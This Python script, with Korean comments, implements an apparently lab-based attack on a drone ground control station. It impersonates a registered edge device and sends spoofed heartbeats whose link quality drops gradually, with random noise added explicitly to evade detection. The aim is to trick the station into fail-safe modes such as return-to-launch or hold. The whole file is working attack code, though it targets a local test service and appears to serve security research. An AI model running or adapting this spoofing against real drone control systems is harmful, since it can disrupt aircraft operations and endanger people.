"""
전술 링크 저하 기반 Fail-safe 유도 공격
PDF 시나리오 #1 | 우크라이나 전장 전자전 사례

공격자가 GCS에 heartbeat를 보내되 link_quality를 점진적으로 낮춘다.
완전 차단이 아닌 '저하'로 GCS의 Fail-safe 정책(RTL/HOLD)을 유도.
탐지 난이도가 높은 시나리오.
"""
from __future__ import annotations
import argparse, random, time
from .common import GcsClient, wait_for_gcs


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="링크 저하 Fail-safe 유도 공격")
    parser.add_argument("--service-url",  default="http://dah-gcs:8080")
    parser.add_argument("--target-edge",  default="edge-dronebot-01",
                        help="공격 대상 엣지 ID (등록된 것으로 위장)")
    parser.add_argument("--degrade-rate", type=float, default=0.025,
                        help="초당 link_quality 감소율")
    parser.add_argument("--interval-s",   type=float, default=1.2)
    parser.add_argument("--duration-s",   type=float, default=90.0)
    args = parser.parse_args(argv)

    client = GcsClient(args.service_url)
    wait_for_gcs(client)

    start = time.time()
    tick = 0
    print(f"[link_degrade] 공격 시작 → 대상 엣지: {args.target_edge}", flush=True)

    while (time.time() - start) < args.duration_s:
        elapsed = time.time() - start
        # 점진적 감소 + 노이즈 (탐지 회피)
        link_quality = max(0.04, 1.0 - elapsed * args.degrade_rate + random.gauss(0, 0.03))
        cpu_load = min(0.98, 0.18 + elapsed * 0.008 + random.gauss(0, 0.02))
        battery_wh = max(50.0, 720.0 - elapsed * 2.1)
        temp_c = min(85.0, 39.5 + elapsed * 0.3)

        try:
            result = client.post("/api/edge/devices/heartbeat", {
                "edge_id":      args.target_edge,
                "status":       "online" if link_quality > 0.2 else "degraded",
                "cpu_load":     round(cpu_load, 3),
                "battery_wh":   round(battery_wh, 1),
                "link_quality": round(link_quality, 3),
                "temperature_c": round(temp_c, 1),
            })
            phase = "정상" if link_quality > 0.7 else ("경고" if link_quality > 0.3 else "임계")
            print(
                f"[link_degrade] tick={tick:04d} | link={link_quality:.3f} [{phase}] "
                f"| cpu={cpu_load:.2f} | temp={temp_c:.1f}°C",
                flush=True,
            )
        except Exception as e:
            print(f"[link_degrade] 오류: {e}", flush=True)

        # 링크 품질이 임계 이하면 간헐적 추가 지연 (패킷 손실 시뮬레이션)
        if link_quality < 0.25 and random.random() < 0.3:
            print(f"[link_degrade] 패킷 손실 시뮬레이션 (link={link_quality:.3f})", flush=True)
            time.sleep(args.interval_s * 2)  # 추가 지연

        tick += 1
        time.sleep(args.interval_s)

    print(f"[link_degrade] 공격 종료 — 최종 link_quality: {max(0.04, 1.0 - args.duration_s * args.degrade_rate):.3f}", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
